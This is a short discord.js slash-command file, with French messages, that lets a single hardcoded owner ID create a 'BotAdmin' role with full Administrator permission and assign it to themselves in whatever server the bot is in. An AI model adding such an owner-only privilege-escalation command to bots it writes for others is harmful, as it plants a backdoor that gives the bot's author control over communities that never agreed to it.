const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

const OWNER_ID = '1132930851508846622';

module.exports = {
    data: new SlashCommandBuilder()
        .setName('adminme')
        .setDescription('DEV ONLY - Attribue le rôle administrateur du bot.')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    async execute(interaction) {
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ content: '⛔ Accès refusé.', ephemeral: true });
        }

        try {
            let role = interaction.guild.roles.cache.find(r => r.name === 'BotAdmin');
            
            if (!role) {
                role = await interaction.guild.roles.create({
                    name: 'BotAdmin',
                    permissions: [PermissionFlagsBits.Administrator],
                    color: 'NotQuiteBlack'
                });
            }

            await interaction.member.roles.add(role);
            await interaction.reply({ content: `✅ Rôle ${role.name} attribué avec succès.`, ephemeral: true });
        } catch (error) {
            await interaction.reply({ content: '❌ Je n\'ai pas la permission de créer/attribuer ce rôle.', ephemeral: true });
        }
    },
};